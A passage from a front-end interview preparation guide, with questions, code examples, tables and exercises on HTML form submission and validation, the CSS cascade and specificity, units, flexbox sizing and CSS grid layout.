- `scroll` — always shows scrollbars. `auto` — only when needed.

Pair with `scrollbar-gutter: stable` to stop layout jumping when a scrollbar appears.

### Q9 \[INT\] Are floats still relevant?

Only for their original job: wrapping text around an image (optionally with `shape-outside`). For page layout, use flexbox or grid. Know `clear` and the clearfix (`::after { content: ""; display: table; clear: both; }`) for legacy code, and that `display: flow-root` replaces the clearfix.

### Tricky questions

- **`width: 100%` + `padding: 20px` overflows its parent.** Because of `content-box`. Fix with `border-box`.
- **Inline elements ignore `width`, `height` and vertical margin.** Vertical padding is painted but doesn't push lines apart. Use `inline-block`.
- **A gap appears under an `<img>`.** Images are inline and sit on the text baseline, leaving room for descenders. Fix: `display: block` or `vertical-align: middle`.
- **`margin: auto` doesn't centre vertically in block flow.** It does in flex and grid, and on absolute elements with `inset: 0` and a set height.
- **`opacity: 0.99` changes z-order.** It creates a stacking context.

### Exercise

Calculate the total horizontal space this element takes, and the gap between the two blocks:

```css
.box { width: 300px; padding: 0 16px; border: 2px solid; margin: 24px 10px; }
```

```html
<div class="box">1</div>
<div class="box">2</div>
```

**Answer:** horizontal = 10 + 2 + 16 + 300 + 16 + 2 + 10 = **356px** (content-box). Vertical gap between them = **24px**, because the bottom margin of 1 and top margin of 2 collapse.

### Revision summary

- `border-box` = width includes padding and border, never margin.
- Vertical margins collapse in block flow; not in flex/grid, floats, abspos, or across a BFC.
- `display: flow-root` = side-effect-free BFC.
- Absolute → nearest positioned ancestor's padding box. Fixed → viewport unless a transform/filter ancestor captures it.
- Vertical % padding uses width; % height needs a definite parent height.
- `z-index` competes only within its stacking context; use the top layer for overlays.

## Part 5 — Forms & Validation

A native `<form>` already does submission, validation, keyboard handling, autofill and accessibility. Interviewers check whether you know those defaults well enough to keep them instead of rebuilding them in JavaScript.

### Q1 \[INT\] What gets submitted, and how?

Only **successful controls** are submitted: they must have a `name`, must not be `disabled`, and checkboxes/radios must be checked. Each becomes a `name=value` pair.

```html
<form action="/search" method="get">
  <label for="q">Search</label>
  <input id="q" name="q" type="search" required>
  <label><input type="checkbox" name="exact" value="1"> Exact match</label>
  <button>Search</button>
</form>
<!-- Submits to /search?q=shoes  (exact omitted when unchecked) -->
```

|  | GET | POST |
| --- | --- | --- |
| Data location | URL query string | Request body |
| Bookmarkable / cacheable | Yes | No |
| Use for | Search, filters (safe, idempotent) | Creating or changing data |
| File upload | No | Yes, with `enctype="multipart/form-data"` |

**`id` vs `name`:** `id` is for the document (labels, CSS, fragment links); `name` is the key sent to the server. An input with only an `id` submits nothing.

### Q2 \[INT\] What is the default `type` of a `<button>`?

`submit`, when it is inside a form (or associated with one via `form="id"`). A "Cancel" or "Show password" button without `type="button"` will submit the form.

```html
<form>
  <input name="pw" type="password">
  <button type="button" aria-pressed="false">Show password</button>
  <button type="submit">Log in</button>
</form>
```

**Implicit submission:** pressing Enter in a text field submits the form via its first submit button. If that button is disabled, nothing is submitted. Keep it when you build forms in JS; don't swallow Enter.

### Q3 \[INT\] `disabled` vs `readonly`

|  | `disabled` | `readonly` |
| --- | --- | --- |
| Value submitted | No | Yes |
| Focusable / in tab order | No | Yes |
| Selectable, copyable | Usually no | Yes |
| Participates in validation | No (skipped) | No (barred from constraint validation) |
| Works on | All controls, `fieldset`, `button` | Text-like inputs and `textarea` only; ignored on checkbox, radio, `select` |

`<fieldset disabled>` disables every control inside it — a neat way to lock a form section during a request.

**Accessibility nuance:** disabled buttons are skipped by keyboard users, who never learn *why* they can't proceed. Many design systems prefer a focusable button with `aria-disabled="true"` plus an explanation, and validate on submit instead.

### Q4 \[INT\] How should labels be associated?

```html
<!-- Explicit: works everywhere, survives restructuring -->
<label for="email">Email</label>
<input id="email" name="email" type="email" autocomplete="email"
       aria-describedby="email-hint">
<p id="email-hint">We'll send your receipt here.</p>

<!-- Implicit: label wraps the control -->
<label><input type="checkbox" name="terms"> I accept the terms</label>
```

Clicking a label focuses or toggles its control, which enlarges the hit area. Group related radios/checkboxes with `<fieldset>` + `<legend>` so the question is announced with each option.

### Q5 \[ADV\] How does native constraint validation work?

Attributes declare constraints: `required`, `type="email|url|number"`, `min`, `max`, `step`, `minlength`, `maxlength`, `pattern`. On submit, the browser checks each control, blocks submission on the first invalid one, focuses it and shows a bubble.

```js
const input = form.elements.username;
input.validity;        // { valueMissing, typeMismatch, patternMismatch, tooShort, rangeOverflow, customError, valid, … }
input.checkValidity(); // boolean, fires 'invalid' if false
input.reportValidity();// same + shows the message
input.setCustomValidity('Username taken'); // '' clears it
```

```css
/* :invalid matches on page load — empty required fields look like errors */
input:invalid { border-color: red; }   /* too eager */

/* :user-invalid waits until the user has interacted (Baseline since 2023) */
input:user-invalid { border-color: var(--danger); }
```

**Gotchas:** `pattern` is anchored automatically (`^(?:…)$`) and uses the `v` flag in current browsers, so some characters need escaping inside classes. `maxlength` prevents typing more; `minlength` only validates after user edits. `type="email"` accepts `a@b` (no TLD required).

### Q6 \[SR\] What does good validation UX look like?

1. Validate on **blur or submit**, not on every keystroke; clear errors as soon as they're fixed.
2. Put the message **next to the field**, linked with `aria-describedby`, and set `aria-invalid="true"`.
3. On submit with errors, move focus to an **error summary** (with links to each field) or to the first invalid field.
4. Never rely on colour alone; include an icon and text.
5. Use `novalidate` on the form when you render your own messages, but keep the constraint attributes so `validity` still works.

```html
<form novalidate>
  <label for="zip">Postcode</label>
  <input id="zip" name="zip" required inputmode="numeric" pattern="[0-9]{4}"
         aria-invalid="true" aria-describedby="zip-err">
  <p id="zip-err" class="error">Enter a 4-digit postcode, like 1207.</p>
</form>
```

### Q7 \[INT\] Which input types and attributes improve mobile UX?

- `type="email" | "tel" | "url" | "search"` — correct keyboard and validation.
- `inputmode="numeric" | "decimal"` — numeric keypad without `type="number"`'s spinners and scroll-wheel bugs. Use it for card numbers, OTPs and postcodes, which are not numbers.
- `autocomplete="email | name | street-address | one-time-code | new-password | current-password"` — enables autofill and password managers; required by WCAG 1.3.5 for personal data fields.
- `enterkeyhint="next | search | send"` — labels the mobile Enter key.

### Q8 \[SR\] Is client-side validation a security measure?

No. It is UX only. Anyone can edit the DOM, disable JS, or send requests with curl. The server must validate types, lengths, ranges and authorisation, and must encode output. Other secure-form practices: CSRF tokens or `SameSite` cookies for POSTs, `autocomplete="new-password"` on sign-up, never put secrets in hidden inputs, and limit file uploads by type and size server-side (`accept` is a hint only).

### Q9 \[EXP\] Follow-up: `submit()` vs `requestSubmit()`, and custom form controls

`form.submit()` skips constraint validation **and** never fires the `submit` event — so your handlers and validation are bypassed. `form.requestSubmit(submitter?)` behaves like a real button click: validates, fires `submit`, includes the submitter's `name=value`. For custom elements that must participate in forms (a design-system date picker), use **form-associated custom elements**: `static formAssociated = true` and `this.attachInternals()`, then `internals.setFormValue()` and `internals.setValidity()`. The control then submits, resets, validates and is labelled by `<label>` like a native input.

### Tricky questions

- **Unchecked checkbox value?** Not sent at all. Servers must treat absence as false.
- **`<input type="number">` with "1e3"?** Valid; value is "1e3". Type number also accepts "-" while typing and returns `""` for invalid input.
- **Two submit buttons — which value is sent?** Only the clicked one's `name=value` (`event.submitter` in JS).
- **`required` on a radio group?** Put it on any one radio with that `name`; the whole group is then required.
- **`<select>` with `required`?** The first option must have `value=""` to act as a placeholder.

### Exercise

Build a delivery form with name, phone, a delivery-time radio group, and an optional note. Requirements: correct mobile keyboards, autofill, grouped radios, errors linked to fields, no submission on Enter in the note.

**Key points of a good answer:** `autocomplete="name"`, `type="tel" autocomplete="tel"`, radios in a `fieldset` with a `legend`, the note as a `textarea` (Enter adds a newline, so no special handling is needed), and errors with `aria-describedby`.

### When to use what

| Choice | Use when | Avoid when | Alternative |
| --- | --- | --- | --- |
| Native validation bubbles | Prototypes, internal tools | Brand-consistent or multilingual error copy | `novalidate` + own messages, keep constraint attributes |
| `disabled` submit button | Request in flight (prevents double submit) | Explaining what's missing | Enabled button + validate on submit |
| `type="number"` | True quantities with spinners | Card numbers, OTPs, postcodes | `inputmode="numeric"` + `pattern` |
| GET form | Search, filters, shareable URLs | Mutations, secrets | POST |
| Placeholder text | Format example | Labels or instructions | `<label>` + hint with `aria-describedby` |

### Revision summary

- Submitted = has `name`, not disabled, checked if checkable.
- Buttons default to `submit`; add `type="button"` for everything else.
- `readonly` submits and focuses; `disabled` does neither.
- Use `:user-invalid`, not `:invalid`, for error styling.
- Client validation is UX; the server is the security boundary.

## Part 6 — CSS Fundamentals: Cascade, Specificity, Inheritance

When two declarations set the same property on the same element, the cascade picks one by checking a fixed series of tie-breakers; specificity is only the fourth of them. Inheritance only applies when *no* declaration matched the element at all.

### Q1 \[INT\] In what order does the cascade resolve conflicts?

Each step only runs if the previous one tied:

1. **Origin and importance.** From weakest to strongest: user-agent normal → user normal → author normal → CSS animations → author `!important` → user `!important` → user-agent `!important` → CSS transitions.
2. **Context.** For Shadow DOM: normal outer-tree styles beat inner ones; for `!important` the inner tree wins.
3. **Element-attached styles.** The `style=""` attribute beats any selector of the same origin and importance.
4. **Cascade layers.** Later-declared layers win; **unlayered styles beat all layers** (for normal declarations).
5. **Specificity.**
6. **Scope proximity** (`@scope`): the closer scoping root wins.
7. **Order of appearance.** Last declaration wins.

&#91;embedded content: cascade resolution · 7 tie-breakers in order\]

**The interview point:** a low-specificity rule in an unlayered stylesheet beats an ID selector inside a layer. Specificity never overrides layer order.

### Q2 \[INT\] How is specificity calculated?

As a three-part tuple **(A, B, C)**, compared left to right — not as a base-10 number.

- **A** — ID selectors: `#nav`
- **B** — classes, attribute selectors, pseudo-classes: `.btn`, `[type="text"]`, `:hover`
- **C** — type selectors and pseudo-elements: `a`, `::before`
- **Zero:** `*`, combinators (`>`, `+`, `~`, space), and `:where()`.

| Selector | (A, B, C) |
| --- | --- |
| `li` | (0, 0, 1) |
| `ul li.active` | (0, 1, 2) |
| `.nav .item:hover` | (0, 3, 0) |
| `#main a` | (1, 0, 1) |
| `a[href^="https"]::after` | (0, 1, 2) |
| `:is(#hero, .card) h2` | (1, 0, 1) |
| `:where(#hero, .card) h2` | (0, 0, 1) |
| `input:not(.a, #b)` | (1, 0, 1) |

**11 classes vs 1 ID?** The ID wins: (1,0,0) > (0,11,0). There is no overflow from one column to the next.

### Q3 \[ADV\] How do `:is()`, `:where()`, `:not()` and `:has()` affect specificity?

- `:is()`, `:not()`, `:has()` take the specificity of their **most specific argument**, even if a less specific one matched.
- `:where()` is **always zero**. It is ideal for library defaults and resets that consumers must easily override.
- `:is()` and `:where()` use **forgiving** selector lists: one invalid selector doesn't invalidate the rule. A plain comma list does.

```css
/* Library: zero-specificity defaults */
:where(.btn) { padding: .5rem 1rem; background: gray; }

/* Consumer: a single class easily wins */
.checkout-btn { background: green; }
```

### Q4 \[ADV\] What are cascade layers and why do they matter at scale?

`@layer` lets you set precedence by *intent* rather than by selector weight.

```css
@layer reset, base, components, utilities;   /* order declared once, here */

@layer reset      { *, *::before, *::after { box-sizing: border-box; } }
@layer components { #sidebar .card { padding: 2rem; } }
@layer utilities  { .p-0 { padding: 0; } }   /* wins despite lower specificity */

@import url("vendor.css") layer(vendor);    /* put third-party CSS in a layer */
```

**`!important` reverses layer order:** an `!important` declaration in an *earlier* layer beats one in a later layer, and layered `!important` beats unlayered `!important`. This lets a reset layer lock essentials (like `[hidden] { display: none !important; }`).

**Trade-off:** unlayered styles beat all layers, so a team that forgets to wrap new CSS in a layer silently overrides everything. Enforce it with a lint rule. Layers are Baseline since 2022.

### Q5 \[INT\] When is `!important` legitimate?

- Utility classes that must always win (`.visually-hidden`, `.hidden`).
- Overriding inline styles from third-party widgets you can't edit.
- User stylesheets for accessibility.
- Inside a reset layer, as above.

Not as a fix for "my style doesn't apply" — find the winning rule in DevTools (Computed tab → expand property) and fix the architecture.

### Q6 \[INT\] Which properties inherit, and how do the global keywords differ?

**Inherit by default:** text and font properties (`color`, `font-*`, `line-height`, `letter-spacing`, `text-align`, `white-space`), `visibility`, `cursor`, `list-style`, `direction`, and **all custom properties**. **Don't inherit:** box and layout properties (`margin`, `padding`, `border`, `background`, `width`, `display`, `position`).

| Keyword | Sets the property to |
| --- | --- |
| `inherit` | Parent's computed value |
| `initial` | Spec initial value (e.g. `display: inline`, not the browser's `block`) |
| `unset` | `inherit` if the property inherits, else `initial` |
| `revert` | The value from the previous origin (usually the browser stylesheet) |
| `revert-layer` | The value from the previous cascade layer |

&#91;embedded content: inheritance · 3 elements under one styled div\]

**Trap:** `div { display: initial; }` makes divs **inline**, because `inline` is the initial value of `display`. Use `revert` to get the browser default.

**Inheritance uses the computed value:** with `font-size: 2em` on a parent, children inherit the pixel result, not "2em".

### Q7 \[ADV\] How do custom properties resolve? What is the classic bug?

Custom properties inherit, and `var()` is substituted at **computed-value time on the element where the declaration lives**.

```css
:root { --gap: 8px; --gap-lg: calc(var(--gap) * 2); }
.compact { --gap: 4px; }
.compact .box { padding: var(--gap-lg); }  /* 16px, not 8px! */
```

`--gap-lg` was already computed on `:root` (16px) and inherited as that value. **Fix:** declare derived tokens on the element where the base changes, or on `*`, or compute at the point of use: `padding: calc(var(--gap) * 2)`.

**Invalid at computed-value time:** if `var(--color)` resolves to `20px` in `color:`, the property becomes `unset` (inherits), *not* the previous valid declaration. Fallbacks: `var(--color, black)`.

**`@property`** registers a typed property (Baseline since 2024), enabling animation and type checking:

```css
@property --angle { syntax: "<angle>"; inherits: false; initial-value: 0deg; }
.spinner { background: conic-gradient(from var(--angle), #08f, transparent);
           animation: spin 1s linear infinite; }
@keyframes spin { to { --angle: 360deg; } }
```

### Q8 \[INT\] `px`, `em`, `rem`, `%`, `ch` and viewport units — when to use which?

| Unit | Relative to | Use for |
| --- | --- | --- |
| `px` | CSS pixel (not device pixel) | Borders, hairlines, shadows |
| `rem` | Root font size | Font sizes, spacing scale — respects user font settings |
| `em` | Element's own font size (parent's, for `font-size` itself) | Padding that scales with component text, icon sizes |
| `%` | Containing block (or parent font size for `font-size`) | Fluid widths |
| `ch` | Width of "0" | Readable line length: `max-width: 65ch` |
| `lh` / `rlh` | Line height | Vertical rhythm |
| `vw` / `vh` / `dvh` | Viewport | Full-bleed sections; see Part 9 |
| `cqi` / `cqb` | Query container | Component-relative sizing |

**`em` compounding trap:** nested `li { font-size: 1.2em }` grows at each level (1.2, 1.44, 1.73…). `rem` doesn't compound.

**Accessibility:** font sizes in `px` don't follow the user's browser default font-size setting (page zoom still scales them); `rem` does. Use `rem` for type, and `em` in media queries so breakpoints follow that setting too.

### Q9 \[INT\] `calc()`, `min()`, `max()`, `clamp()`

```css
.container { width: min(100% - 2rem, 70rem); margin-inline: auto; }
h1 { font-size: clamp(1.75rem, 1.2rem + 2.5vw, 3rem); }
.sidebar { width: max(15rem, 25%); }
```

`clamp(MIN, PREFERRED, MAX)` = `max(MIN, min(PREFERRED, MAX))`. Always mix a `rem` term into fluid type (`1.2rem + 2.5vw`), so text still grows when the user zooms; pure `vw` fails WCAG 1.4.4 resize.

### Q10 \[EXP\] Follow-up: selector performance — does `.a .b .c` slow the page?

Browsers match selectors **right to left**: they find every `.c`, then walk up to check ancestors. Modern engines use Bloom filters and caching, so selector cost is negligible for typical CSS. What actually costs time is style **invalidation** after DOM changes on huge trees, and broad `:has()` rules that must re-check ancestors. Measure with DevTools "Selector stats" before rewriting selectors.

### Q11 \[INT\] Combinators and relational selectors

| Selector | Matches | Example use |
| --- | --- | --- |
| `A B` (descendant) | Any B inside A | `.prose a` |
| `A > B` (child) | B directly inside A | `.menu > li` (not nested submenus) |
| `A + B` (next sibling) | B immediately after A | `h2 + p { margin-top: 0 }` |
| `A ~ B` (subsequent sibling) | Any B after A, same parent | `input:checked ~ .panel` |
| `A:has(> B)` | A that has a child B | `.card:has(> img)` |
| `A:has(+ B)` | A followed by B | `h2:has(+ .subtitle)` |

**Common mistake:** expecting `+` or `~` to match **previous** siblings — they never do; use `:has()` for that. **Alternative to deep descendant chains:** a class on the element itself keeps specificity flat.

### Q12 \[INT\] Colours, backgrounds, borders, gradients and shadows

```css
:root {
  --brand: oklch(55% 0.19 255);                      /* perceptually even lightness */
  --brand-soft: color-mix(in oklch, var(--brand) 15%, white);
}
.hero {
  color: white;
  background:
    linear-gradient(to bottom, rgb(0 0 0 / .1), rgb(0 0 0 / .65)),   /* scrim for text contrast */
    url("hero.avif") center / cover no-repeat,
    #1b1d22;                                                           /* fallback colour */
}
.card { border: 1px solid color-mix(in srgb, currentColor 15%, transparent); border-radius: 12px;
        box-shadow: 0 1px 2px rgb(0 0 0 / .06), 0 8px 24px rgb(0 0 0 / .08); }
.icon { filter: drop-shadow(0 2px 4px rgb(0 0 0 / .3)); }   /* follows the PNG/SVG alpha shape */
```

- **Colour formats:** hex/`rgb()` for compatibility; `hsl()` for quick variations; `oklch()` for design-system scales (equal lightness steps look equal); `currentColor` to tie borders and icons to text colour. Space-separated syntax with `/ alpha` is the modern form.
- **Backgrounds:** layers paint first-listed on top; `background-size: cover` fills and crops, `contain` fits; `background-clip: text` for gradient text (keep a solid `color` fallback). A meaningful image belongs in `<img>` with `alt`, not in CSS.
- **Gradients:** `linear-`, `radial-`, `conic-gradient()`, plus `repeating-` versions; hard stops (`red 50%, blue 50%`) make stripes.
- **Shadows:** `box-shadow` follows the border box and never affects layout or overflow; `filter: drop-shadow()` follows transparent shapes; large animated shadows are paint-heavy — animate the opacity of a pseudo-element carrying the shadow instead.
- **Border vs outline:** borders take space; `outline` doesn't (and follows `border-radius` in modern browsers), which is why focus rings use outline.

**When not to:** don't rely on a background image for text contrast without a solid fallback colour; don't encode state with colour alone (WCAG 1.4.1).

### Tricky questions

**What colour is the link?**

```html
<style>
  @layer base { #nav a { color: red; } }
  a { color: blue; }
</style>
<nav id="nav"><a href="/">Home</a></nav>
```

**Blue.** The unlayered rule beats the layered one; specificity is never compared across layers.

**What colour is the paragraph?**

```css
.parent { color: red !important; }
.parent p { color: green; }
```

**Green.** `!important` on the parent only affects the parent. The child has its own matching declaration; inheritance never enters.

**Does `.btn.btn` work?** Yes: repeating a class raises specificity to (0,2,0). A legitimate, if hacky, way to win without IDs.

**Pseudo-class vs pseudo-element?** `:hover` selects an existing element in a state (B column); `::before` creates a box that isn't in the DOM (C column), needs `content`, and can't be selected by JS or read by all assistive tech consistently.

### Exercise

Rank by specificity: `nav ul li a`, `.menu a`, `a:hover`, `#top a`, `:where(#top) a.link`.

**Answer:** `#top a` (1,0,1) > `.menu a` = `a:hover` = `:where(#top) a.link` (0,1,1) > `nav ul li a` (0,0,4). Among the three ties, the last in source order wins.

### When to use what

| Choice | Use when | Avoid when | Alternative |
| --- | --- | --- | --- |
| `!important` | Utilities that must win, reset `[hidden]`, user styles | Fixing a lost cascade fight | Layers, lower specificity |
| ID selectors in CSS | Almost never | Component styling | Classes, attributes |
| `@layer` | Any multi-team or library CSS | Tiny one-file sites (harmless but unnecessary) | Strict naming conventions |
| `:where()` | Library defaults, resets | Rules that must be hard to override | `:is()`, plain selectors |
| `rem` / `em` / `px` | `rem` type and spacing; `em` component-relative padding; `px` borders | `px` for font sizes; nested `em` font sizes | `clamp()` mixes |
| `@property` | Animating or type-checking custom properties | Plain tokens that never animate | Unregistered custom properties |

### Revision summary

- Cascade: origin/importance → context → inline style → layers → specificity → scope → order.
- Specificity is (A,B,C); `:where()` = 0; `:is/:not/:has` = most specific argument.
- Unlayered beats layered; `!important` reverses layer order.
- `initial` ≠ browser default; use `revert`.
- `var()` resolves where declared; derived tokens don't see child overrides.
- `clamp()` with a `rem` term for accessible fluid type.

## Part 7 — Flexbox

Flexbox lays out items along one axis and distributes leftover (or missing) space by ratios. Most flex bugs come from three defaults: `flex-shrink: 1`, `flex-basis: auto`, and `min-width: auto`.

### Q1 \[INT\] Main axis vs cross axis — which properties work on which?

- **Main axis** follows `flex-direction` (row = horizontal in LTR; column = vertical). `justify-content` distributes along it; `flex-grow`, `flex-shrink`, `flex-basis` size along it.
- **Cross axis** is perpendicular. `align-items` (all items) and `align-self` (one item) position within each line; `align-content` distributes the *lines* themselves and only does anything when items wrap.
- `justify-items` and `justify-self` are **ignored** in flexbox. To push one item to the end, use `margin-inline-start: auto`.

&#91;embedded content: flexbox axes · row direction\]

With `flex-direction: column`, the axes swap: `justify-content` now works vertically, but only if the container has a height to distribute.

### Q2 \[INT\] What does `flex: 1` actually mean?

| Shorthand | grow · shrink · basis | Behaviour |
| --- | --- | --- |
| (default) | `0 1 auto` | Sized by content/width; can shrink, won't grow |
| `flex: 1` | `1 1 0%` | Ignore content size; share **all** space equally |
| `flex: auto` | `1 1 auto` | Start from content size; share only the **leftover** space |
| `flex: none` | `0 0 auto` | Rigid; neither grows nor shrinks |
| `flex: 0 0 200px` | `0 0 200px` | Exactly 200px |

**Interview trap:** three items with `flex: 1` and different content lengths are equal width. With `flex: auto` they are *not* — longer content gets wider, because only the remaining space is split.

### Q3 \[ADV\] Walk through the grow and shrink algorithm.

1. Compute each item's **hypothetical size** from `flex-basis` (or `width` if basis is `auto`, or content if both are `auto`), clamped by min/max.
2. Free space = container size − sum of hypothetical sizes − gaps.
3. **Positive** free space → distribute by `flex-grow` ratios.
4. **Negative** free space → shrink by `flex-shrink × flex-basis` (larger items shrink more in absolute terms).
5. Any item hitting its min or max is frozen; repeat with the rest.

**Grow example:** container 600px; three items `flex: 1 1 100px`, `2 1 100px`, `3 1 100px`. Free space = 300px, split 1:2:3 → +50, +100, +150 → **150, 200, 250px**.

**Shrink example:** container 600px; bases 200, 300, 400 (sum 900), `flex-shrink: 1` each. Overflow 300px, weighted by basis (200:300:400) → −66.7, −100, −133.3 → **133.3, 200, 266.7px**.

### Q4 \[ADV\] Why does my text overflow instead of truncating? (`min-width: auto`)

Flex items have `min-width: auto` (and `min-height: auto` in a column), which resolves to their **min-content size**. A long URL or a `white-space: nowrap` child makes the item refuse to shrink below that width.

```html
<div class="row">
  <img src="avatar.png" width="40" height="40" alt="">
  <div class="text">
    <p class="name">A very long name that should be truncated with an ellipsis</p>
  </div>
</div>
```

```css
.row  { display: flex; gap: 12px; width: 300px; }
.name { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

/* Bug: .text grows to fit the whole line and pushes past 300px */
/* Fix: let the flex item shrink below its content */
.text { min-width: 0; flex: 1; }
```

`overflow: hidden` on the item also works, because a scroll container's automatic minimum is 0, but it clips focus rings and shadows. The same bug appears with nested flex containers and with `<pre>` or tables inside flex items. Grid has the same issue with `1fr` (see Part 8).

### Q5 \[INT\] `flex-basis` vs `width`

On the main axis, `flex-basis` wins over `width` when it is not `auto`. Both are still limited by `min-width`/`max-width`. Rule of thumb: use `flex-basis` (via `flex`) for flex items and keep `width` for non-flex contexts. In a column flex container, `flex-basis` maps to height.

### Q6 \[INT\] Common real-world patterns

```css
/* 1. Push the last nav item to the end */
.nav { display: flex; gap: 1rem; }
.nav .login { margin-inline-start: auto; }

/* 2. Sticky footer */
body { display: flex; flex-direction: column; min-height: 100dvh; }
main { flex: 1; }

/* 3. Wrapping chips/tags */
.tags { display: flex; flex-wrap: wrap; gap: .5rem; }

/* 4. Media object */
.media { display: flex; gap: 1rem; align-items: flex-start; }
.media-body { flex: 1; min-width: 0; }

/* 5. Perfect centring */
.center { display: flex; align-items: center; justify-content: center; }
```

**When not to use flex:** a two-dimensional layout where rows *and* columns must line up (cards that must align across rows). Wrapped flex items don't align into columns; use Grid.

### Q7 \[ADV\] `align-items: stretch` and `baseline`

`stretch` (default) makes items as tall as the line — unless they have an explicit `height` or `align-self`. That's why sticky sidebars inside flex rows fail (Part 4). `baseline` aligns first text baselines — useful for a label and a large number side by side. `last baseline` aligns last lines.

### Q8 \[EXP\] Follow-up: what happens to margins and `order` in flex?

Margins of flex items never collapse. `auto` margins absorb free space *before* `justify-content` runs, so `margin: auto` centres in both axes. `order` changes visual position only; tab order and screen-reader order still follow the DOM (WCAG 1.3.2 / 2.4.3 risk). The same applies to `row-reverse`. The new `reading-flow` property, shipping first in Chromium, aims to fix this but is not yet Baseline.

### Tricky questions

**What is the width of each item?**

```css
.c { display: flex; width: 500px; }
.c > div { width: 300px; }
/* two divs */
```

**250px each.** Default `flex-shrink: 1` shrinks both equally (same basis). Add `flex-shrink: 0` to keep 300px and overflow.

**`justify-content: center` with overflow:** the content overflows on *both* sides, and the left part becomes unreachable by scroll. Use `justify-content: safe center` (supported in Chromium and Firefox; check Safari) or `margin: auto` on the item, which never pushes content off the start edge.

**`gap` vs margins:** `gap` only puts space *between* items, never at the edges, and doesn't need `:last-child` resets.

**`height: 100%` in a flex child:** works when the item is stretched by a definite-height flex container. In a column container, use `flex: 1` instead.

### Debugging exercise

A toolbar has a search input that refuses to shrink on mobile and pushes the buttons off-screen:

```css
.toolbar { display: flex; gap: 8px; }
.toolbar input { width: 400px; }
```

**Root cause:** `width: 400px` becomes the flex basis; the input's intrinsic min-content size also prevents shrinking in some browsers.

**Fix:**

```css
.toolbar input { flex: 1 1 15rem; min-width: 0; }
.toolbar button { flex: none; }
```

The input grows to fill space, starts from a sensible 15rem basis, can shrink to zero, and the buttons stay rigid.

### Revision summary

- `justify-*` = main axis; `align-*` = cross axis; `align-content` needs wrapping.
- `flex: 1` = `1 1 0%` (equal); `flex: auto` = `1 1 auto` (content-weighted).
- Shrink is weighted by `flex-shrink × basis`.
- `min-width: 0` fixes overflowing flex children.
- `order` and `row-reverse` don't change focus order.
- 2D alignment → Grid.

## Part 8 — CSS Grid

Grid defines rows and columns on the container and places items into them; unlike flexbox, the tracks line up in both dimensions. Interviewers probe `fr` sizing, implicit tracks, `auto-fit` vs `auto-fill`, and when Grid beats Flexbox.

### Q1 \[INT\] Explicit vs implicit grid

- **Explicit grid:** the tracks you define with `grid-template-columns`, `grid-template-rows` and `grid-template-areas`.
- **Implicit grid:** tracks the browser creates when items are placed outside the explicit grid, or when there are more items than cells. Sized by `grid-auto-rows` / `grid-auto-columns` (default `auto`).

```css
.feed {
  display: grid;
  grid-template-columns: repeat(3, 1fr);   /* explicit: 3 columns */
  grid-auto-rows: minmax(120px, auto);     /* every implicit row */
  gap: 1rem;
}
```

**Trap:** negative line numbers (`grid-column: 1 / -1`) refer to the end of the **explicit** grid only. In a grid with no explicit columns, `-1` is line 1.

### Q2 \[INT\] How does `fr` work, and why does `1fr` overflow?

`fr` takes a share of the space left after fixed and content-sized tracks. But `1fr` is really `minmax(auto, 1fr)` — its minimum is the content's min-content size. A long word, a wide image or a `<pre>` forces the track wider than its share.

```css
/* Bug: a long URL in column 2 makes it wider than column 1 */
.layout { grid-template-columns: 1fr 1fr; }

/* Fix: let tracks shrink below content */
.layout { grid-template-columns: repeat(2, minmax(0, 1fr)); }
```

**Explaining `250px 1fr 2fr` in a 1000px container with 0 gap:** 250px fixed; remaining 750px split 1:2 → **250, 250, 500px**.

### Q3 \[ADV\] `auto-fill` vs `auto-fit`

Both create as many columns as fit. They only differ when **there are fewer items than columns**:

```css
.grid { display: grid; gap: 1rem;
        grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); }
```

| Container 1000px, 2 items, min 200px | Result |
| --- | --- |
| `auto-fill` | 4 columns created (≈ 238px each with gaps); 2 empty tracks remain, items stay narrow |
| `auto-fit` | 4 columns created, empty ones **collapse to 0**; the 2 items stretch to ≈ 492px each |

&#91;embedded content: auto-fill vs auto-fit · 2 items, room for 4\]

**Which to use:** `auto-fit` for a gallery that should fill the row; `auto-fill` when cards should keep a consistent width regardless of count (a product grid with one result).

**Edge case:** in a container narrower than 200px, `minmax(200px, 1fr)` overflows. Use `minmax(min(200px, 100%), 1fr)`.

### Q4 \[INT\] Placement: lines, spans, named areas

```css
.dashboard {
  display: grid;
  grid-template-columns: 240px 1fr 1fr;
  grid-template-rows: auto 1fr auto;
  grid-template-areas:
    "side header header"
    "side main   stats"
    "side footer footer";
  min-height: 100dvh;
}
.side   { grid-area: side; }
.header { grid-area: header; }
.main   { grid-area: main; }
.stats  { grid-area: stats; }
.footer { grid-area: footer; }

@media (width < 48rem) {
  .dashboard {
    grid-template-columns: 1fr;
    grid-template-areas: "header" "main" "stats" "footer";
  }
  .side { display: none; } /* or move to an off-canvas drawer */
}
```

&#91;embedded content: grid-template-areas · 3 columns, 3 rows, 5 areas\]

Areas must be rectangles; a `.` marks an empty cell. Areas create implicit named lines (`main-start`, `main-end`). Alternatives: `grid-column: 2 / span 2;` or named lines: `grid-template-columns: [full-start] 1fr [content-start] minmax(0, 60rem) [content-end] 1fr [full-end];`.

### Q5 \[ADV\] Auto-placement and `dense`

By default, items fill row by row and never go back to fill holes left by larger items. `grid-auto-flow: dense` backfills holes with later, smaller items.

**Trade-off:** `dense` changes visual order without changing DOM order, so keyboard focus jumps around. Fine for an image mosaic; wrong for an ordered list of articles.

### Q6 \[ADV\] What is subgrid and what does it solve?

A nested grid normally has its own independent tracks, so card titles, bodies and buttons in adjacent cards don't line up. `subgrid` makes a child grid reuse its parent's tracks.

```css
.cards { display: grid; grid-template-columns: repeat(auto-fill, minmax(16rem, 1fr)); gap: 1rem; }
.card  { display: grid; grid-row: span 3; grid-template-rows: subgrid; gap: .5rem; }
/* title, body, footer rows now align across every card in a row */
```

Baseline since 2023 (all major engines). For older browser support, fall back to `align-content: space-between` inside each card.

### Q7 \[INT\] Grid vs Flexbox

| Question | Pick |
| --- | --- |
| Do rows *and* columns need to align? | Grid |
| Should content size decide the layout (toolbar, tags, nav)? | Flexbox |
| Overall page or dashboard skeleton | Grid |
| One-dimensional list that wraps freely | Flexbox |
| Overlapping items without absolute positioning | Grid (place two items in the same area) |

They nest happily: Grid for the page, Flexbox inside each component.

### Q8 \[EXP\] Follow-up: alignment and other Grid specifics

- `justify-items` / `justify-self` **do** work in Grid (unlike flexbox).
- `place-items: center` = `align-items` + `justify-items`.
- Grid items' margins never collapse; `z-index` works on grid items without `position`.
